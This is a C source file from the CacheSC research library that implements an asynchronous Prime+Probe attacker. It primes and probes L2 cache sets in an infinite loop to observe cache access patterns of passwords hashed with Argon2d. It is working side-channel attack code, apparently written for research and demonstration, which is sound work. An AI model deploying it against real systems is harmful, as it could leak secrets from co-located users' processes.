/*
 * This file is part of the CacheSC library (https://github.com/Miro-H/CacheSC),
 * which implements Prime+Probe attacks on virtually and physically indexed
 * caches.
 *
 * Copyright (C) 2020  Miro Haller
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * Contact: miro.haller@alumni.ethz.ch
 *
 * Short description of this file:
 * This file is part of the demonstration of the implementation of an entry
 * point for an asynchronous attack to observe cache access patterns of
 * passwords hashed with Argon2d.
 * This file implements an asynchronous attacker running Prime+Probe in an
 * infinite loop.
 */

#include <assert.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include <cachesc.h>


/*
 * Configure side-channel attack
 */

// There are two versions of this attacker:
// - FULL_CACHE_ATTACK 1: Prime+Probe the entire L2 cache
// - FULL_CACHE_ATTACK 0: Prime+Probe only every 16th set of L2 (as a single
//                        Argon2 block covers 16 sets)
#define FULL_CACHE_ATTACK 0
#define PARTIAL_ATTACK_SETS   7,  23,  39,  55,  71,  87, 103, 119, \
                            135, 151, 167, 183, 199, 215, 231, 247, \
                            263, 279, 295, 311, 327, 343, 359, 375, \
                            391, 407, 423, 439, 455, 471, 487, 503
#define PARTIAL_ATTACK_LEN (L2_SETS / 16)
#define TARGET_CACHE L2
#define MSRMTS_PER_SAMPLE L2_SETS
#define CPU_NUMBER 1


// local functions and global variables
static volatile int user_abort = 0;

void abortHandler(int unused);

int main(int argc, char **argv)
{
    /*
     * Initial preparation
     */
    set_seed();

    cache_ctx *ctx = get_cache_ctx(TARGET_CACHE);

    #if FULL_CACHE_ATTACK
        cacheline *cache_ds = prepare_cache_ds(ctx);
    #else
        uint32_t attack_sets[PARTIAL_ATTACK_LEN] = {PARTIAL_ATTACK_SETS};
        cacheline *cache_ds = prepare_cache_set_ds(ctx, attack_sets,
                                                   PARTIAL_ATTACK_LEN);
    #endif

    pin_to_cpu(CPU_NUMBER);

    // Register handler to catch CTRL+C and exit gracefully
    signal(SIGINT, abortHandler);

    cacheline *curr_head = cache_ds;
    cacheline *next_head;


    /*
     * Start performing Prime+Probe in an infinite loop
     */
    print_banner("Start cache attack(s)");

    prepare_measurement();

    while(!user_abort) {
        /* prime */
        printf("start prime: %llu\n", __rdtsc());
        curr_head = prime(curr_head);

        /* probe */
        next_head = probe(TARGET_CACHE, curr_head);
        printf("probe done: %llu\n", __rdtsc());

        curr_head = next_head;
    }

    print_banner("Stop cache attack(s)");


    /*
     * Cleanup
     */
    #if FULL_CACHE_ATTACK
        release_cache_ds(ctx, cache_ds);
    #else
        release_cache_set_ds(ctx, cache_ds);
    #endif
    release_cache_ctx(ctx);

    return EXIT_SUCCESS;
}

void abortHandler(int unused) {
    user_abort = 1;
}
